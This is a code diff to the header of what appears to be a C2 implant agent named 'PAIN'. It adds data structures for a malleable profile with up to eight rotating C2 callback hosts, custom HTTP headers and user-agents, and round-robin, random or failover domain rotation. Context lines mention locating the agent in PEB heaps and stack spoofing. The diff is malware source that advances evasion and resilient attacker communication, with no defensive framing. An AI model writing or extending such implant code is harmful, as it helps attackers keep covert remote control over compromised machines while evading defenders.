@@ -13,6 +13,29 @@
 // Magic value stored inside the agent we use to find it by scanning PEB heaps
 #define AGENT_HEAP_MAGIC 0xC0DED00DC0FFEE
 
+// Maximum number of C2 callbacks supported by the malleable profile
+#define PAIN_MAX_CALLBACKS 8
+
+// Maximum number of custom HTTP request headers per callback
+#define PAIN_MAX_HEADERS 16
+
+// One custom header entry (name: value) from the malleable profile
+struct PAIN_HEADER {
+    PCHAR Name;
+    PCHAR Value;
+};
+
+// One C2 endpoint entry parsed from the malleable profile blob
+struct PAIN_CALLBACK {
+    PCHAR       Host;
+    UINT16      Port;
+    BOOL        Ssl;
+    PCHAR       UserAgent;
+    PCHAR       Uri;
+    PAIN_HEADER Headers[PAIN_MAX_HEADERS];
+    UINT32      HeaderCount;
+};
+
 // DECLAPI declares a typed function pointer matching the real Windows function
 // for example : DECLAPI(NtAllocateVirtualMemory) expands to:
                 //  decltype(NtAllocateVirtualMemory)* NtAllocateVirtualMemory
@@ -249,7 +272,7 @@ namespace Root
 
         // C2 config - populated in Init() from build-time Config.cc data
         struct {
-            PCHAR  Host;       // C2 hostname
+            PCHAR  Host;       // C2 hostname (legacy / first callback)
             UINT16 Port;       // C2 port
             BOOL   Ssl;        // HTTPS?
             PCHAR  UserAgent;  // HTTP user-agent string
@@ -260,6 +283,14 @@ namespace Root
             HANDLE MainThreadHandle;  // real handle to main thread (for stack spoofing)
             UINT32 AuthMode;   // 0=none, 1=cmd (persistent), 2=otk (one-time)
             PBYTE  AuthKey;    // 16 raw bytes decoded from PAIN_AUTH_KEY hex
+
+            // Malleable profile / domain rotation (populated by Malleable_Init)
+            UINT32         CallbackCount;     // 0 = legacy single-host mode
+            UINT32         CallbackIndex;     // index of the currently active callback
+            UINT32         ActiveCallbackIdx; // index the current InetSession was opened for
+            UINT32         RotationStrategy;  // 0=round-robin, 1=random, 2=failover
+            UINT32         RngState;          // LCG state for random rotation
+            PAIN_CALLBACK* Callbacks;         // heap-allocated array of PAIN_MAX_CALLBACKS entries
         } Config = {};
 
         // machine info - collected in Init()
